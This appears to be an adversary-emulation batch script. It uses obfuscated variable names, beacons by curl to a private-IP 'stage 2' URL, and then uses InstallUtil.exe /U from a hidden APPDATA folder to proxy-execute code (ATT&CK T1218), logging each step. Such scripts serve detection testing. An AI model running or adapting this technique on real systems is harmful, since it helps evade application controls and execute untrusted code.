@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\9728\8924aded
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9728-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=control.txt
SET ewjmdkff=9728
SET logfile=%APPDATA%\!pudaazx!\macula-simulations.log
SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_complete>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_start>> "!logfile!" 2>nul
cd /d "!pjkcpgw!" >nul 2>&1
SET pqkja=!errorlevel!
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_result=!pqkja!>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: installutil_start>> "!logfile!" 2>nul
SET txzyja=0
SET kifxcvb=
"%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe" /logfile= /LogToConsole=false /U "!syjfr!"
IF !errorlevel! EQU 0 (SET txzyja=1) ELSE (SET txzyja=0&SET kifxcvb=installutil_failed)
echo [!tsvar!][TTP][!hlbnp!][!ewjmdkff!]: T1218|InstallUtil=!txzyja!:!kifxcvb!>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: installutil_complete>> "!logfile!" 2>nul
ENDLOCAL